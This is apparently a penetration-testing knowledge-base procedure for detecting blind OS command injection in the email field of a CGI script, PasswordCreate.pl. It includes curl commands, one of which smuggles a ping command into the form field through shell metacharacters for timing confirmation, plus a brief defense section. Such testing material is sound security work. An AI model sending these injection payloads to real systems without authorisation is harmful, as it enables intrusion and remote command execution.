---
tags:
  - command-injection
  - blind
  - os
type: procedure
tools:
  - '[[tools/Netsparker]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ping-injection-10]]'
  - '[[commands/ping-injection-20]]'
verified: false
platforms:
  - Web
  - Linux
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-13T23:52:38.997Z'
sub_techniques: []
id: 3c8c6464-2ead-44c3-82d7-f618b45d19e3
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Test for Blind OS Command Injection

## Summary

This procedure tests the email POST parameter for OS command injection using shell metacharacters like '&' to chain commands, confirmed via tools like Netsparker.

## Description

The CGI script fails to sanitize inputs, allowing command chaining in the email field. Blind nature requires OOB or timing confirmation. Impacts include RCE for info disclosure via DNS or delays.

## Requirements

1. POST request capability (curl or Netsparker)
2. Attacker-controlled IP for pings
3. Timer for response measurement

## Defense

Defensive measures and detection strategies:

- Sanitize all inputs to remove shell metacharacters
- Use parameterized execution in Perl
- Monitor process logs for unexpected commands

## Objectives

1. Inject and chain OS commands blindly
2. Set up for confirmation methods
3. Demonstrate potential RCE

## Instructions

### Step 1: Send Baseline POST

**Context**: Establish normal response time.

**Command** (Baseline POST):
```bash
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "email=-------------------------&ibm-submit=Submit" http://target/cgi-bin/PasswordCreate.pl
```

> Expected output: Quick response without errors.

### Step 2: Inject Ping Commands

**Context**: Use Netsparker or curl to inject pings for delay testing.

**Command** ([[commands/ping-injection-10]]):
```bash
curl -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "email=;&ping -n 10 1.1.1.1;&ibm-submit=Submit" http://target/cgi-bin/PasswordCreate.pl
```

> Expected output: Delayed response indicating execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/ping-injection-10]]
- [[commands/ping-injection-20]]

## Tools Used

- [[tools/Netsparker]]

## Tags

- [[command-injection]]
- [[blind]]
- [[os]]
